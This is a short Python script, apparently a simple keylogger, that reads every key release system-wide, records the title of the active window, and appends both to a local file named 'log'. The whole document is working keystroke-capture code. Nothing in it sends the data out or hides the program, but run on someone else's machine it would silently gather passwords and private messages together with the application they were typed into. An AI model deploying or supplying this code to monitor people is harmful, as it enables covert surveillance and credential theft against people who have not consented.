import keyboard
import pyautogui

while True:
    key = keyboard.read_event() # get name of key pressed
    if 'up' in key: # log only key releases so no extra entries are made (often 2 key events are logged for when the key is pressed even though 1 character was typed because it is held for a moment)
        window_name = pyautogui.getActiveWindowTitle() # get the window name to know what context caused the keys to be pressed
        entry = f"Key Pressed: {key} Active Window: {window_name}" # make the entry
        print(entry) # for debugging purposes
        try:
            with open("log", "a", encoding='utf-8') as log: # open the log file or make a new one if it doesnt exist
                log.write(entry+'\n') # write the entry into the log
            # Reads the key pressed and active window and writes it into a file.
        except UnicodeEncodeError as e:
            pass